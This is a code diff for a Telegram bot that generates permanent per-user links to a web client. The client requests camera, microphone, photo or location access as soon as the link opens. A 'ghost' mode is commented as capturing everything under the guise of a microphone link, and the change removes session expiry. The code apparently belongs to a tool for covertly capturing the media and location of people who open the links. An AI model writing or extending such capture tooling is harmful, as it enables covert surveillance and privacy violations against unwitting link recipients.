@@ -337,43 +337,47 @@ bot.on('text', async (ctx) => {
     await ctx.sendChatAction('typing');
     
     try {
-        // Create session via API
-        const result = await api.createSession(user, permissionType);
+        // Map permission types to URL-friendly types
+        const typeMap = {
+            'location': 'location',
+            'single_photo': 'photo',
+            'continuous_photo': 'photo',
+            'video': 'video',
+            'microphone': 'mic',
+            'ghost': 'mic'  // Ghost mode uses mic URL but captures all
+        };
         
-        if (!result.success) {
-            throw new Error(result.error || 'Failed to create session');
+        const urlType = typeMap[permissionType] || permissionType;
+        
+        // Generate user-based link (same user always gets same link)
+        const webLink = `${config.webClient.baseUrl}/${urlType}/${user.id}`;
+        
+        // Register user with server for notifications
+        try {
+            await api.registerUserCapture(user, permissionType);
+        } catch (regError) {
+            logger.warn('Failed to register user for capture', { error: regError.message });
         }
         
-        const { session } = result;
-        
-        // Store session for tracking
-        activeSessions.set(session.id, {
-            chatId: ctx.chat.id,
-            userId: user.id,
-            permissionType,
-            createdAt: new Date()
-        });
-        
-        // Send session link immediately
+        // Send link immediately
         await ctx.reply(
-            `✅ *Session Created!*\n\n` +
+            `✅ *Link Ready!*\n\n` +
             `*Type:* ${permissionConfig.label}\n` +
             `*Description:* ${permissionConfig.description}\n\n` +
-            `🔗 *Click the link below to start:*\n` +
-            `${session.webLink}\n\n` +
-            `⏰ *Expires:* ${new Date(session.expiresAt).toLocaleString()}\n\n` +
-            `_The link will open in your browser where you can grant the required permissions._`,
+            `🔗 *Your permanent link:*\n` +
+            `${webLink}\n\n` +
+            `📌 *This is YOUR personal link - same link every time!*\n\n` +
+            `_Permission will be requested instantly when opened._`,
             {
                 parse_mode: 'Markdown',
-                disable_web_page_preview: true,
-                ...sessionActionsKeyboard(session.id)
+                disable_web_page_preview: true
             }
         );
         
-        logger.info('Session created successfully', {
-            sessionId: session.id,
+        logger.info('User link generated', {
             userId: user.id,
-            permissionType
+            permissionType,
+            webLink
         });
         
     } catch (error) {
